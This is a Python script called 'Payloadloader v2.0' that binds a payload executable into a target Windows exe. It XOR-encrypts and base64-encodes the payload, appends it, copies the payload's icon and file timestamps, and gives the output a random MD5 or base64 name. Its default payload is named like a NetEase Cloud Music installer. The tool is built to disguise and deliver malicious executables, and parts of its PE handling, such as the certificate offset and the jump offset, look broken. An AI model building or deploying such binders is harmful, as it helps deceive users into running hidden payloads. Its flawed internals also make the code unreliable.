import os
import pefile
import struct
import shutil
import hashlib
import base64
import random
import argparse
from colorama import Fore, Style, init 
import tkinter as tk
import time
import sys

def progress_bar(total):
    for i in range(0, total + 1, 10):  # 每次增加2
        percent = (i / total) * 100
        bar = '=' * (i * 40 // total)
        sys.stdout.write(f"\r[{bar:<40}] {percent:.2f}%")
        sys.stdout.flush()
        time.sleep(0.1)

progress_bar(100)
progress_bar(100)

os.system("cls")

def print_colored(text, color):
    print(f"{color}{text}{Style.RESET_ALL}")
print_colored("""
  ,---.                                 ,--.            ,--.                  ,--.
 /  O  \  ,--,--,   ,---.  ,--,--,      `--' ,--,--,    `--'  ,---.   ,---. ,-'  '-.
|  .-.  | |      \ | .-. | |      \     ,--. |      \   ,--. | .-. : | .--' '-.  .-'
|  | |  | |  ||  | ' '-' ' |  ||  |     |  | |  ||  |   |  | \   --. \ `--.   |  |
`--' `--' `--''--'  `---'  `--''--'     `--' `--''--' .-'  /  `----'  `---'   `--'
                                                      '---'
[+] Payloadloader v2.0
[+] Author: Anonfsocialize
[+] Telegram: t.me/Anonfsocialize
[+] Github: https://github.com/TR1123
              
""",
color=Fore.BLUE)


def gather_file_info_win(binary):
    flItms = {}
    with open(binary, 'rb') as f:
        f.seek(int('3C', 16))
        flItms['CertLOC'] = struct.unpack("<I", f.read(4))[0]
        flItms['CertSize'] = struct.unpack("<I", f.read(4))[0]
    # 返回字典
    return flItms

# 定义一个函数copy_cert，用于复制exe文件中的证书
def copy_cert(exe):
    # 调用gather_file_info_win函数，获取exe文件的信息
    flItms = gather_file_info_win(exe)
    # 如果证书的位置或大小为0，则返回None
    if flItms['CertLOC'] == 0 or flItms['CertSize'] == 0:
        return None
    # 打开exe文件，以二进制模式读取
    with open(exe, 'rb') as f:
        # 将文件指针移动到证书的位置
        f.seek(flItms['CertLOC'], 0)
        # 读取证书的内容
        cert = f.read(flItms['CertSize'])
    # 返回证书的内容
    return cert

# 定义一个函数，用于检查可执行文件的数字签名
def check_digital_signature(exe):
    # 尝试打开可执行文件
    try:
        # 使用pefile库打开可执行文件
        pe = pefile.PE(exe)
        # 判断可执行文件是否有数字签名
        if hasattr(pe, 'DIRECTORY_ENTRY_SECURITY') and pe.DIRECTORY_ENTRY_SECURITY:
            # 如果有数字签名，返回True和数字签名信息
            return True, pe.DIRECTORY_ENTRY_SECURITY
        else:
            # 如果没有数字签名，返回False和None
            return False, None
    except Exception as e:
        # 如果发生异常，返回False和异常信息
        return False, str(e)

# 检查文件完整性
def check_file_integrity(exe):
    # 判断文件是否存在且可读
    return os.path.isfile(exe) and os.access(exe, os.R_OK)

# 定义一个函数，用于获取pe文件中的图标数据
def get_icon_data(pe):
    # 初始化图标数据为None
    icon_data = None
    # 遍历pe文件中的资源目录
    for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        # 如果资源目录的名称存在，并且名称为'1'
        if entry.name and entry.name.string == '1':
            # 遍历资源目录中的子目录
            for sub_entry in entry.directory.entries:
                # 如果子目录的id为1
                if sub_entry.id == 1:
                    # 获取子目录中的第一个条目的数据，并赋值给图标数据
                    icon_data = sub_entry.directory.entries[0].data
                    # 跳出循环
                    break
    # 返回图标数据
    return icon_data

# 定义一个函数，用于对数据进行异或加密和解密
def xor_encrypt_decrypt(data, key):
    # 遍历数据中的每一个字节
    return bytes([b ^ key for b in data])

# 定义一个函数，用于将数据进行base64编码
def base64_encode(data):
    # 使用base64模块中的b64encode函数对数据进行编码
    return base64.b64encode(data)

def base64_decode(data):
    return base64.b64decode(data)

# 定义一个函数，用于生成MD5哈希值的文件名
def generate_md5_filename(base_name):
    # 使用hashlib库中的md5函数，将base_name编码为字节流，并生成MD5哈希值
    md5_hash = hashlib.md5(base_name.encode()).hexdigest()
    # 返回以MD5哈希值为前缀，后缀为.exe的文件名
    return f"{md5_hash}.exe"

# 定义一个函数，用于对文件名进行base64编码
def base64_encode_filename(file_name):
    # 将文件名编码为字节
    encoded_bytes = base64.b64encode(file_name.encode())
    # 将编码后的字节解码为字符串，并添加.exe后缀
    return f"{encoded_bytes.decode()}.exe"

def inject_exe(target_exe_path, payload_exe_path, output_exe_path, xor_key, show_log=False):
    # 打开目标可执行文件和负载数据
    target_pe = pefile.PE(target_exe_path)
    payload_pe = pefile.PE(payload_exe_path)

    # 打开输出文件
    with open(output_exe_path, 'wb') as output_file:
        # 将目标可执行文件写入输出文件
        output_file.write(open(target_exe_path, 'rb').read())
        # 读取负载数据
        payload_data = open(payload_exe_path, 'rb').read()
        
        # 加密负载数据
        encrypted_payload = xor_encrypt_decrypt(payload_data, xor_key)
        if show_log:
            # 打印负载数据的原始大小和加密后的大小
            print(f"[*] inject {payload_exe_path} :")
            print(f"[*] Payload Original load size: {len(payload_data)}")
            print(f"[*] Payload Encrypted load size: {len(encrypted_payload)}")
        
        # 对负载数据进行base64编码
        encoded_payload = base64_encode(encrypted_payload)
        
        # 将编码后的负载数据写入输出文件
        output_file.write(encoded_payload)
        # 计算跳转偏移量
        jump_offset = len(open(target_exe_path, 'rb').read()) + len(encoded_payload) + 2
        # 将跳转偏移量写入输出文件
        output_file.write(struct.pack('<I', jump_offset))

    # 获取负载数据的图标数据
    icon_data = get_icon_data(payload_pe)
    if icon_data:
        # 将图标数据写入输出文件
        with open(output_exe_path, 'ab') as output_file:
            output_file.write(icon_data)

    # 复制负载数据的文件属性到输出文件
    shutil.copystat(payload_exe_path, output_exe_path)

    if show_log:
        # 打印注入完成的信息
        print(f"[*] Injection completed, output file: {output_exe_path}")

def extract_and_inject(target_exe, payload_exe, output_exe, xor_key, show_log=False):
    # 检查目标文件是否损坏或不可访问
    if not check_file_integrity(target_exe):
        print("[-] Unable to inject file, the file is damaged or inaccessible.")
        return

    # 提取目标文件的证书
    cert = copy_cert(target_exe)
    if cert:
        if show_log:
            print(f"[*] Extracted certificate size: {len(cert)}")
    else:
        if show_log:
            print("[*] Certificate not found")

    # 检查数字签名
    has_signature, signature_info = check_digital_signature(target_exe)
    if has_signature:
        if show_log:
            print("[*] The file has a digital label")
            # 可以在这里打印签名信息
            print(f"[*] Digital signature information: {signature_info}")
    else:
        print("[-] The file has no digital signature")
    
    # 注入payload文件
    inject_exe(target_exe, payload_exe, output_exe, xor_key, show_log)

# 生成一个MD5密钥
def generate_md5_key():
    # 使用os.urandom()函数生成一个16字节的随机数
    # 使用hashlib.md5()函数将随机数进行MD5加密
    # 使用hexdigest()函数将加密后的结果转换为十六进制字符串
    return hashlib.md5(os.urandom(16)).hexdigest()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Payload loader...")
    parser.add_argument('-e', '--exe', type=str, required=True, help='要注入的exe文件路径')
    parser.add_argument('-o', '--output', type=str, required=True, help='输出exe文件路径')
    parser.add_argument('-x', '--xor', type=int, default=123, help='XOR加密密钥,默认123')
    parser.add_argument('-r', '--show_log', action='store_true', help='显示执行过程的日志')
    
    args = parser.parse_args()

    target_exe = args.exe
    output_exe = args.output
    xor_key = args.xor
    show_log = args.show_log

    if os.path.exists(output_exe):
        if random.choice([True, False]):
            output_exe = generate_md5_filename(output_exe)
        else:
            output_exe = base64_encode_filename(output_exe)

    payload_exe = 'NeteaseCloudMusic_Music_official_3.0.0.202884_64.exe'  # 默认负载文件路径
    extract_and_inject(target_exe, payload_exe, output_exe, xor_key, show_log)

    md5_key = generate_md5_key()
    new_output_exe = f"{md5_key}.exe"
    os.rename(output_exe, new_output_exe)

    # 精简的输出格式
    if show_log:
        print(f"[*] Rename the output file to: {new_output_exe}")
    else:
        print(f"[+] File injection succeeded: {new_output_exe}")